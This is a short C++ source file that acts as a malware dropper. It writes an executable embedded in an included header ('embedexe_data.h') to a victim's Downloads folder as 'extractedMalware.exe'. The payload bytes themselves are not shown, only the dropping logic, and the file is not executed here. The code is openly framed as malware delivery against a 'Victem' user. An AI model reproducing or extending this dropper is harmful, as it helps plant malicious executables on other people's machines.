#include<iostream>
#include<fstream>
#include "embedexe_data.h"
int main(){
    const std::string distDir="C:\\Users\\Victem\\Downloads\\";
    std::ofstream outFile(distDir+"extractedMalware.exe",std::ios::binary);
    outFile.write(reinterpret_cast<const char*>(embedexe_data),sizeof(embedexe_data));
    outFile.close();
    return 0;
}